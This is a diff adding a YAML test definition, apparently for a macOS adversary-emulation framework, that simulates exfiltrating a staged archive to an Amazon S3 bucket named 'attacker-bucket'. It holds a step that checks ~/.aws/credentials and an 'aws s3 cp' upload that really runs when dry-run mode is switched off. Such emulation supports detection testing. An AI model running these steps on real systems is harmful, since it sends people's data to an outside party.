@@ -1,0 +1,131 @@
+id: 011-upload-aws-s3
+name: Upload to AWS S3
+description: Exfiltrates data by uploading files to Amazon S3 buckets
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: e1f2a3b4-c5d6-4e7f-8091-a2b3c4d5e6f7
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  file_path:
+    description: File to upload to S3
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  s3_bucket:
+    description: Target S3 bucket name
+    type: string
+    default: "attacker-bucket"
+  s3_region:
+    description: AWS region
+    type: string
+    default: "us-east-1"
+  s3_key:
+    description: S3 object key/path
+    type: string
+    default: "exfiltrated/data.tar.gz"
+  aws_access_key:
+    description: AWS access key ID
+    type: string
+    default: "AKIA..."
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Check AWS credentials
+    type: command
+    executor: bash
+    command: |
+      if [ -f ~/.aws/credentials ]; then
+        echo "AWS credentials found"
+        grep -q 'aws_access_key_id' ~/.aws/credentials && echo "Access key configured"
+      else
+        echo "WARNING: AWS credentials not found at ~/.aws/credentials"
+      fi
+    cleanup: false
+  
+  - name: Prepare S3 upload
+    type: command
+    executor: bash
+    command: |
+      echo "AWS S3 Upload Configuration:"
+      echo "  Bucket: {{ args.s3_bucket }}"
+      echo "  Region: {{ args.s3_region }}"
+      echo "  Key: {{ args.s3_key }}"
+      echo "  File: $(basename '{{ args.file_path }}')"
+      echo "  Size: $(du -h '{{ args.file_path }}' | cut -f1)"
+    cleanup: false
+  
+  - name: Execute S3 upload
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: AWS S3 Upload"
+        echo "Command: aws s3 cp '{{ args.file_path }}' \\\"
+        echo "  s3://{{ args.s3_bucket }}/{{ args.s3_key }}' \\\"
+        echo "  --region {{ args.s3_region }}\""
+      else
+        if command -v aws &> /dev/null; then
+          aws s3 cp '{{ args.file_path }}' \
+            "s3://{{ args.s3_bucket }}/{{ args.s3_key }}" \
+            --region {{ args.s3_region }} \
+            --sse AES256
+        else
+          echo "ERROR: AWS CLI not installed"
+          exit 1
+        fi
+      fi
+    cleanup: false
+checks:
+  - name: AWS CLI available
+    description: Verify AWS CLI is installed
+    type: command
+    command: command -v aws &> /dev/null && echo "AWS CLI available" || echo "AWS CLI not found"
+  
+  - name: File exists and readable
+    description: Verify file for upload
+    type: command
+    command: test -r '{{ args.file_path }}'
+tests:
+  dry_run:
+    - name: Test AWS S3 upload (dry-run)
+      description: Test S3 upload without actual request
+      type: basic
+      steps:
+        - name: Create test file
+          type: command
+          executor: bash
+          command: |
+            echo "Test data for S3" > /tmp/test_s3.dat
+            ls -lh /tmp/test_s3.dat
+        
+        - name: Prepare S3 command
+          type: command
+          executor: bash
+          command: |
+            echo "S3 Upload Command (dry-run):"
+            echo "aws s3 cp /tmp/test_s3.dat s3://bucket/path/test_s3.dat"
+        
+        - name: Show configuration
+          type: command
+          executor: bash
+          command: |
+            echo "Bucket: attacker-bucket"
+            echo "Region: us-east-1"
+            echo "File: test_s3.dat"
+cleanup:
+  - name: Remove test file
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_s3.dat
+    ignore_errors: true
